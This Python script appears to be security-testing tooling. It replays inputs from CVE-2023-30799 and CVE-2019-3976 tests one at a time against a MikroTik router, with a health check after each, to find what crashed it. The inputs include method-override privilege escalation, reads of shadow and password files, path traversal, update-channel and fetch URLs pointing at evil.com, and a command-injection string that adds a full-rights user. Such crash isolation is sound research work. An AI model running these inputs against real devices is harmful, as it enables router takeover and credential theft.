#!/usr/bin/env python3
"""
Crash Isolation: CVE-2023-30799 & CVE-2019-3976 Regression Crash Replay
========================================================================
During CVE regression testing, the router crashed during:
  - CVE-2023-30799 (FOISted) testing: method override headers on /rest/system/identity
  - CVE-2019-3976 (autoup[REDACTED]) testing: around /tool/fetch and package operations

This script replays each input ONE AT A TIME with health checks between them
to isolate the exact crash trigger.

Target: [REDACTED-INTERNAL-IP] ([REDACTED-CREDS])
"""

import requests
import json
import time
import sys
import datetime
import paramiko
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

TARGET = "[REDACTED-INTERNAL-IP]"
ADMIN_USER = "admin"
ADMIN_PASS = "admin"
BASE = f"http://{TARGET}"
AUTH = (ADMIN_USER, ADMIN_PASS)

EVIDENCE = {
    "metadata": {
        "script": "crash_isolation.py",
        "target": TARGET,
        "timestamp": datetime.datetime.now().isoformat(),
        "purpose": "Isolate crash triggers from CVE regression testing",
    },
    "cve_2023_30799_tests": [],
    "cve_2019_3976_tests": [],
    "crashes": [],
}


def log(msg):
    ts = datetime.datetime.now().strftime("%H:%M:%S")
    print(f"[{ts}] {msg}", flush=True)


def health_check(label=""):
    """Check if router is alive. Returns (alive, uptime)"""
    try:
        r = requests.get(f"{BASE}/rest/system/resource", auth=AUTH, timeout=5)
        if r.status_code == 200:
            data = r.json()
            return True, data.get("uptime", "?")
    except:
        pass
    return False, None


def wait_for_recovery(timeout=120):
    """Wait for router to come back after crash"""
    log(f"  Waiting for router recovery (up to {timeout}s)...")
    start = time.time()
    while time.time() - start < timeout:
        alive, uptime = health_check()
        if alive:
            elapsed = int(time.time() - start)
            log(f"  Router recovered after {elapsed}s (uptime: {uptime})")
            return True, uptime
        time.sleep(5)
    log(f"  Router did NOT recover within {timeout}s")
    return False, None


def rest_request(method, path, headers=None, json_data=None, timeout=10):
    """Make REST API request, return (status, response_text, error)"""
    url = f"{BASE}{path}"
    hdrs = {"Content-Type": "application/json"}
    if headers:
        hdrs.update(headers)
    try:
        r = requests.request(method, url, auth=AUTH, headers=hdrs,
                           json=json_data, timeout=timeout)
        try:
            return r.status_code, r.json(), None
        except:
            return r.status_code, r.text[:500], None
    except requests.exceptions.Timeout:
        return None, None, "Timeout"
    except requests.exceptions.ConnectionError:
        return None, None, "ConnectionError"
    except Exception as e:
        return None, None, str(e)


def ssh_command(cmd, timeout=10):
    """Execute SSH command, return (rc, stdout, error)"""
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(TARGET, port=22, username=ADMIN_USER, password=ADMIN_PASS,
                      timeout=timeout, allow_agent=False, look_for_keys=False)
        stdin, stdout, stderr = client.exec_command(cmd, timeout=timeout)
        rc = stdout.channel.recv_exit_status()
        out = stdout.read().decode(errors='replace')[:500]
        err = stderr.read().decode(errors='replace')[:500]
        client.close()
        return rc, out, err
    except Exception as e:
        return -1, "", str(e)


def run_test(test_id, description, test_func, category_list):
    """Run a single test with pre/post health check"""
    # Pre-check
    alive, pre_uptime = health_check()
    if not alive:
        log(f"  ❌ Router down before test {test_id} — skipping")
        return False

    log(f"  [{test_id}] {description}")
    log(f"        Pre-uptime: {pre_uptime}")

    # Execute test
    ts = datetime.datetime.now().isoformat()
    result = test_func()
    result["test_id"] = test_id
    result["description"] = description
    result["timestamp"] = ts
    result["pre_uptime"] = pre_uptime

    # Brief pause then post-check
    time.sleep(2)
    alive, post_uptime = health_check()
    result["post_alive"] = alive
    result["post_uptime"] = post_uptime

    if not alive:
        log(f"        ⚠️  CRASH DETECTED! Router not responding after this input!")
        result["crashed"] = True
        EVIDENCE["crashes"].append({
            "test_id": test_id,
            "description": description,
            "timestamp": ts,
            "pre_uptime": pre_uptime,
        })
        category_list.append(result)

        # Try to wait for recovery
        recovered, new_uptime = wait_for_recovery(120)
        if recovered:
            result["recovery_uptime"] = new_uptime
            return True
        else:
            log(f"        Router did not recover. Stopping tests.")
            return False
    else:
        log(f"        Post-uptime: {post_uptime} — Router OK")
        result["crashed"] = False
        category_list.append(result)
        return True


# ============================================================
# CVE-2023-30799 TEST INPUTS (method override headers)
# ============================================================

def test_30799_method_override(header_name, method_value):
    """Test method override header on /rest/system/identity"""
    def _test():
        status, resp, err = rest_request(
            "POST", "/rest/system/identity",
            headers={header_name: method_value},
            json_data={"name": "escalation_test"}
        )
        return {
            "endpoint": "POST /rest/system/identity",
            "header": f"{header_name}: {method_value}",
            "body": {"name": "escalation_test"},
            "http_status": status,
            "response": str(resp)[:300] if resp else None,
            "error": err,
        }
    return _test


def test_30799_priv_esc(endpoint, user, password, method="POST", body=None):
    """Test privilege escalation endpoint"""
    def _test():
        status, resp, err = rest_request(method, endpoint,
                                         json_data=body)
        return {
            "endpoint": f"{method} {endpoint}",
            "body": body,
            "http_status": status,
            "response": str(resp)[:300] if resp else None,
            "error": err,
        }
    return _test


def test_30799_internal_path(path):
    """Test internal file path access"""
    def _test():
        status, resp, err = rest_request("GET", f"/rest/file{path}")
        return {
            "endpoint": f"GET /rest/file{path}",
            "http_status": status,
            "response": str(resp)[:300] if resp else None,
            "error": err,
        }
    return _test


def test_30799_ssh_cmd(cmd):
    """Test SSH super-admin command"""
    def _test():
        rc, out, err = ssh_command(cmd)
        return {
            "command": cmd,
            "ssh_rc": rc,
            "stdout": out[:200],
            "stderr": err[:200],
        }
    return _test


# ============================================================
# CVE-2019-3976 TEST INPUTS (firmware down[REDACTED])
# ============================================================

def test_3976_channel_set(channel_url):
    """Test malicious update channel URL"""
    def _test():
        status, resp, err = rest_request(
            "POST", "/rest/system/package/update/set",
            json_data={"channel": channel_url}
        )
        return {
            "endpoint": "POST /rest/system/package/update/set",
            "body": {"channel": channel_url},
            "http_status": status,
            "response": str(resp)[:300] if resp else None,
            "error": err,
        }
    return _test


def test_3976_check_updates():
    """Test check-for-updates"""
    def _test():
        status, resp, err = rest_request(
            "POST", "/rest/system/package/update/check-for-updates",
            json_data={}
        )
        return {
            "endpoint": "POST /rest/system/package/update/check-for-updates",
            "http_status": status,
            "response": str(resp)[:300] if resp else None,
            "error": err,
        }
    return _test


def test_3976_downgrade_ssh():
    """Test firmware down[REDACTED] via SSH"""
    def _test():
        rc, out, err = ssh_command("/system package down[REDACTED]")
        return {
            "command": "/system package down[REDACTED]",
            "ssh_rc": rc,
            "stdout": out[:200],
            "stderr": err[:200],
        }
    return _test


def test_3976_fake_npk():
    """Test uploading a fake NPK firmware file"""
    def _test():
        url = f"{BASE}/rest/file"
        try:
            fake_npk = b"NPK\x01" + b"\x00" * 100
            r = requests.post(url, auth=AUTH,
                            files={"file": ("firmware.npk", fake_npk)},
                            timeout=10)
            return {
                "endpoint": "POST /rest/file (multipart upload)",
                "filename": "firmware.npk",
                "size": len(fake_npk),
                "http_status": r.status_code,
                "response": r.text[:300],
            }
        except Exception as e:
            return {"error": str(e)}
    return _test


def test_3976_fetch(url_payload, mode="http"):
    """Test /tool/fetch with potentially dangerous URL"""
    def _test():
        status, resp, err = rest_request(
            "POST", "/rest/tool/fetch",
            json_data={"url": url_payload, "mode": mode, "dst-path": "/dev/null"}
        )
        return {
            "endpoint": "POST /rest/tool/fetch",
            "body": {"url": url_payload, "mode": mode},
            "http_status": status,
            "response": str(resp)[:300] if resp else None,
            "error": err,
        }
    return _test


def main():
    log("=" * 70)
    log("CRASH ISOLATION: CVE-2023-30799 & CVE-2019-3976")
    log(f"Target: {TARGET}")
    log("=" * 70)

    alive, uptime = health_check()
    if not alive:
        log("FATAL: Router not reachable")
        return
    log(f"Router alive: uptime {uptime}")
    EVIDENCE["metadata"]["initial_uptime"] = uptime

    # ================================================================
    # CVE-2023-30799 REPLAY
    # ================================================================
    log("\n" + "=" * 70)
    log("PART 1: CVE-2023-30799 (FOISted) — Input Replay")
    log("  Suspected trigger: Method override headers on /rest/system/identity")
    log("=" * 70)

    tests_30799 = [
        # First: test the method override headers one by one
        ("30799-01", "Method override: X-HTTP-Method-Override: PUT",
         test_30799_method_override("X-HTTP-Method-Override", "PUT")),
        ("30799-02", "Method override: X-HTTP-Method-Override: DELETE",
         test_30799_method_override("X-HTTP-Method-Override", "DELETE")),
        ("30799-03", "Method override: X-HTTP-Method-Override: PATCH",
         test_30799_method_override("X-HTTP-Method-Override", "PATCH")),
        ("30799-04", "Method override: X-HTTP-Method: PUT",
         test_30799_method_override("X-HTTP-Method", "PUT")),
        ("30799-05", "Method override: X-Method-Override: PUT",
         test_30799_method_override("X-Method-Override", "PUT")),

        # Then: super-admin read ops
        ("30799-06", "Super-admin path: /nova/etc/passwd",
         test_30799_internal_path("/nova/etc/passwd")),
        ("30799-07", "Super-admin path: /nova/etc/shadow",
         test_30799_internal_path("/nova/etc/shadow")),
        ("30799-08", "Super-admin path: /flash/nova/etc/devel-login",
         test_30799_internal_path("/flash/nova/etc/devel-login")),
        ("30799-09", "Super-admin path: /rw/disk/user.dat",
         test_30799_internal_path("/rw/disk/user.dat")),
        ("30799-10", "Super-admin path: /rw/disk/shadow",
         test_30799_internal_path("/rw/disk/shadow")),

        # SSH commands
        ("30799-11", "SSH: /user print detail",
         test_30799_ssh_cmd("/user print detail")),
        ("30799-12", "SSH: /system package print",
         test_30799_ssh_cmd("/system package print")),
        ("30799-13", "SSH: /system routerboard print (CHR specific)",
         test_30799_ssh_cmd("/system routerboard print")),

        # Privilege escalation attempts (write as read user)
        ("30799-14", "Priv esc: POST /rest/user/add as admin",
         test_30799_priv_esc("/rest/user/add", ADMIN_USER, ADMIN_PASS, "POST",
                            {"name": "esc_test", "group": "full", "password": "test"})),
        ("30799-15", "Priv esc: POST /rest/system/identity with bad method",
         test_30799_priv_esc("/rest/system/identity", ADMIN_USER, ADMIN_PASS, "PUT",
                            {"name": "escalation_test"})),
    ]

    for test_id, desc, test_func in tests_30799:
        cont = run_test(test_id, desc, test_func, EVIDENCE["cve_2023_30799_tests"])
        if not cont:
            break
        time.sleep(1)

    # Check if we need to wait for recovery
    alive, _ = health_check()
    if not alive:
        wait_for_recovery(120)

    # ================================================================
    # CVE-2019-3976 REPLAY
    # ================================================================
    log("\n" + "=" * 70)
    log("PART 2: CVE-2019-3976 (Autoup[REDACTED]) — Input Replay")
    log("  Suspected trigger: /tool/fetch with malicious URLs or package ops")
    log("=" * 70)

    alive, uptime = health_check()
    if not alive:
        log("Router still down — cannot continue CVE-2019-3976 tests")
    else:
        log(f"Router alive: uptime {uptime}")

        tests_3976 = [
            # Update channel injection
            ("3976-01", "Channel URL: http://evil.com/update",
             test_3976_channel_set("http://evil.com/update")),
            ("3976-02", "Channel URL: ftp://evil.com:21/update",
             test_3976_channel_set("ftp://evil.com:21/update")),
            ("3976-03", "Channel URL: ../../../../etc/passwd",
             test_3976_channel_set("../../../../etc/passwd")),
            ("3976-04", "Channel URL: (set back to long-term)",
             test_3976_channel_set("long-term")),

            # Check for updates
            ("3976-05", "Check for updates",
             test_3976_check_updates()),

            # SSH down[REDACTED] command
            ("3976-06", "SSH: /system package down[REDACTED]",
             test_3976_downgrade_ssh()),

            # Fake NPK upload
            ("3976-07", "Upload fake NPK firmware file",
             test_3976_fake_npk()),

            # Fetch tool with dangerous URLs
            ("3976-08", "Fetch: http://evil.com/firmware.npk",
             test_3976_fetch("http://evil.com/firmware.npk", "http")),
            ("3976-09", "Fetch: ftp://evil.com/update.npk",
             test_3976_fetch("ftp://evil.com/update.npk", "ftp")),
            ("3976-10", "Fetch: http://127.0.0.1/backdoor",
             test_3976_fetch("http://127.0.0.1/backdoor", "http")),

            # SSH command injection in channel
            ("3976-11", "SSH: channel set with injection",
             test_30799_ssh_cmd('/system package update set channel="http://evil.com; /user add name=x group=full"')),
        ]

        for test_id, desc, test_func in tests_3976:
            cont = run_test(test_id, desc, test_func, EVIDENCE["cve_2019_3976_tests"])
            if not cont:
                break
            time.sleep(1)

    # ================================================================
    # SAVE RESULTS
    # ================================================================
    out_path = "/home/[REDACTED]/Desktop/[REDACTED-PATH]/MikroTik/evidence/crash_isolation.json"
    with open(out_path, "w") as f:
        json.dump(EVIDENCE, f, indent=2, default=str)
    log(f"\nResults saved to {out_path}")

    # Summary
    crashes = EVIDENCE["crashes"]
    if crashes:
        log(f"\n{'='*70}")
        log(f"CRASHES DETECTED: {len(crashes)}")
        for c in crashes:
            log(f"  ⚠️  {c['test_id']}: {c['description']}")
    else:
        log(f"\n{'='*70}")
        log("NO CRASHES — All inputs survived on this target")
        log("(Crashes during original testing may have been caused by")
        log(" accumulated state from prior phases)")


if __name__ == "__main__":
    main()
